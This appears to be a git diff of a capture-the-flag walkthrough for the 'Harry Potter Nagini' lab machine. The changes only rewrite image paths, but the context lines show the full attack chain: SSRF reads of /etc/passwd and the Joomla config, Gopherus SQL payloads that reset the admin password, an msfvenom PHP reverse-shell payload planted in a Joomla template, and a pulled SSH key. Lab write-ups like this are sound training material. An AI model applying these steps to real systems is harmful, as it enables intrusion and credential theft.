@@ -8,11 +8,11 @@ We use nmap to scan the target machine with the command:
 nmap -sC -sV -p- 192.168.1.174
 ```
 
-![Alt text](./img/nmap.PNG?raw=true "NMAP Results")
+![Alt text](./HARRY_POTTER_NAGINI/img/nmap.PNG?raw=true "NMAP Results")
 
 I navigate to the web page to see what it is and to check if we find any visible vulnerability on that page.
 
-![Alt text](./img/web_page_port80.PNG?raw=true "Port 80")
+![Alt text](./HARRY_POTTER_NAGINI/img/web_page_port80.PNG?raw=true "Port 80")
 
 We run a scan on the port 80 with gobuster to search for interesting things.
 
@@ -20,7 +20,7 @@ We run a scan on the port 80 with gobuster to search for interesting things.
 gobuster dir --url http://192.168.1.174 -x .php,.js,.txt,.html --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
 ```
 
-![Alt text](./img/gobuster.PNG?raw=true "GOBUSTER SCAN")
+![Alt text](./HARRY_POTTER_NAGINI/img/gobuster.PNG?raw=true "GOBUSTER SCAN")
 
 We start browsing the /note.txt and we find as follow:
 
@@ -52,7 +52,7 @@ Using curl we do a GET request on https://quic.nagini.hogwarts:
 ./curl --http3 https://quic.nagini.hogwarts
 ```
 
-![Alt text](./img/http3.PNG?raw=true "CURL HTTP3")
+![Alt text](./HARRY_POTTER_NAGINI/img/http3.PNG?raw=true "CURL HTTP3")
 
 We retrieve 2 important informations:
 1 /internalResourceFeTcher.php
@@ -60,11 +60,11 @@ We retrieve 2 important informations:
 
 Let's see what is /internalResourceFeTcher.php
 
-![Alt text](./img/internalFetcher.PNG?raw=true "/internalResourceFeTcher.php")
+![Alt text](./HARRY_POTTER_NAGINI/img/internalFetcher.PNG?raw=true "/internalResourceFeTcher.php")
 
 Let's try to search for a and see the result.
 
-![Alt text](./img/a.PNG?raw=true "/internalResourceFeTcher.php search")
+![Alt text](./HARRY_POTTER_NAGINI/img/a.PNG?raw=true "/internalResourceFeTcher.php search")
 
 Noted something?
 
@@ -74,7 +74,7 @@ The search append in the url **?url=a**, so let's try to see if there is any **S
 curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///etc/passwd
 ```
 
-![Alt text](./img/passwd.PNG?raw=true "/etc/passwd")
+![Alt text](./HARRY_POTTER_NAGINI/img/passwd.PNG?raw=true "/etc/passwd")
 
 As you might have noticed, in the webserver there is Joomla, so now let's see if we can access to Jumla configuration file.
 
@@ -82,14 +82,14 @@ As you might have noticed, in the webserver there is Joomla, so now let's see if
 curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php
 ```
 
-![Alt text](./img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")
+![Alt text](./HARRY_POTTER_NAGINI/img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")
 
 Searching on Google "SSRF exploit mysql",
-![Alt text](./img/google.PNG?raw=true "Google search")
+![Alt text](./HARRY_POTTER_NAGINI/img/google.PNG?raw=true "Google search")
 I found my answers in [Gopherus](https://github.com/tarunkant/Gopherus)
 
 First step with Gopherus is to create a payload that give us the table list so using the command **use joomla; show tables;**.
-![Alt text](./img/showTables.PNG?raw=true "SHOW Tables payload")
+![Alt text](./HARRY_POTTER_NAGINI/img/showTables.PNG?raw=true "SHOW Tables payload")
 
 Appending the payload to curl, does not work.
 
@@ -99,7 +99,7 @@ So, I try to add the payload on the url in the browser. It seems that doesn't wo
 
 If you don't see anything refresh the page, it can take few refresh before something is displayed.
 
-![Alt text](./img/1try.PNG?raw=true "List Tables")
+![Alt text](./HARRY_POTTER_NAGINI/img/1try.PNG?raw=true "List Tables")
 
 As you can see we can display the tables and we can see that there is a joomla_users table, which we are going to see next by creating another payload with Gopherus as done previously.
 
@@ -110,7 +110,7 @@ USE joomla; SELECT * FROM joomla_users
 ```
 
 We could list the users and find the user **site_admin** and it's password.
-![Alt text](./img/joomla_users.PNG?raw=true "Joomla Users")
+![Alt text](./HARRY_POTTER_NAGINI/img/joomla_users.PNG?raw=true "Joomla Users")
 
 After trying a lot of MD5 decoder, I decided to create another payload to change the password using **password1234**, so it's hased is **bdc87b9c894da5168059e00ebffb9077**.
 
@@ -120,15 +120,15 @@ Our command will be then:
 use joomla; update joomla_users set password = 'bdc87b9c894da5168059e00ebffb9077' where username='site_admin';select * from joomla_users;
 ```
 
-![Alt text](./img/newP.PNG?raw=true "New Password")
+![Alt text](./HARRY_POTTER_NAGINI/img/newP.PNG?raw=true "New Password")
 
 We are now able to login in the Joomla's administration portal, by going to http://192.168.1.174/joomla/administrator
 
-![Alt text](./img/joomlaAdminLogin.PNG?raw=true "Admin Login")
+![Alt text](./HARRY_POTTER_NAGINI/img/joomlaAdminLogin.PNG?raw=true "Admin Login")
 
 We can insert **super_admin**/**password1234** and we're in!
 
-![Alt text](./img/adminPage.PNG?raw=true "Admin Page")
+![Alt text](./HARRY_POTTER_NAGINI/img/adminPage.PNG?raw=true "Admin Page")
 
 We can now modify a template adding a payload that we are going to generate with **msfvenom**
 
@@ -136,11 +136,11 @@ We can now modify a template adding a payload that we are going to generate with
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o test.php
 ```
 
-![Alt text](./img/msfVenom.PNG?raw=true "MSFVENOM")
+![Alt text](./HARRY_POTTER_NAGINI/img/msfVenom.PNG?raw=true "MSFVENOM")
 
 Let's start **msfconsole** using **explit/multi/handler** and setting up the payload as **php/meterpreter/reverse_tcp**
 
-![Alt text](./img/msf.PNG?raw=true "MSFCONSOLE")
+![Alt text](./HARRY_POTTER_NAGINI/img/msf.PNG?raw=true "MSFCONSOLE")
 
 Next step will be to copy the content of test.php into our joomla template, so let's see what is inside our payload:
 
@@ -148,19 +148,19 @@ Next step will be to copy the content of test.php into our joomla template, so l
 cat test.php
 ```
 
-![Alt text](./img/payload.PNG?raw=true "Payload")
+![Alt text](./HARRY_POTTER_NAGINI/img/payload.PNG?raw=true "Payload")
 
 Now we move into the Admin console and we navigate till the Template editor.
 
-![Alt text](./img/editTemplate.PNG?raw=true "Edit Template")
+![Alt text](./HARRY_POTTER_NAGINI/img/editTemplate.PNG?raw=true "Edit Template")
 
 We are going now to paste our payload in line 9 and we save.
 
-![Alt text](./img/editedTemplate.PNG?raw=true "Edited Template")
+![Alt text](./HARRY_POTTER_NAGINI/img/editedTemplate.PNG?raw=true "Edited Template")
 
 Once saved, just go to [http://quic.nagini.hogwarts/joomla/infex.php](http://quic.nagini.hogwarts/joomla/infex.php) and **BOOOOOOOOOM**.... We got a reverse shell in our meterpreter.
 
-![Alt text](./img/reverse.PNG?raw=true "REVERSE SHELL")
+![Alt text](./HARRY_POTTER_NAGINI/img/reverse.PNG?raw=true "REVERSE SHELL")
 
 At this point we can open the shell and start exploring:
 
@@ -213,7 +213,7 @@ We can now try to login as snape via ssh:
 ssh snape@quic.nagini.hogwarts
 ```
 
-![Alt text](./img/sanpe.PNG?raw=true "SNAPE")
+![Alt text](./HARRY_POTTER_NAGINI/img/sanpe.PNG?raw=true "SNAPE")
 
 I tried to check if we have sudo permission, but no, then I checked the system permission to run some code and found something interesting.
 
@@ -269,7 +269,7 @@ Start a web server
 python3 -m http.server 80
 ```
 
-![Alt text](./img/http.PNG?raw=true "LOCAL WEB SERVER")
+![Alt text](./HARRY_POTTER_NAGINI/img/http.PNG?raw=true "LOCAL WEB SERVER")
 
 On the hacked machine, using the snape user, we use wget to download the file id_rsa.pub
 
@@ -350,8 +350,8 @@ Password: '@Alohomora#123'
 
 Let's connect in ssh!
 
-![Alt text](./img/rootSSH.PNG?raw=true "ROOT SSH")
+![Alt text](./HARRY_POTTER_NAGINI/img/rootSSH.PNG?raw=true "ROOT SSH")
 
 Finally we are **root**... Let's take the last flag!!!!
 
-![Alt text](./img/rootFlag.PNG?raw=true "ROOT Flag")
+![Alt text](./HARRY_POTTER_NAGINI/img/rootFlag.PNG?raw=true "ROOT Flag")
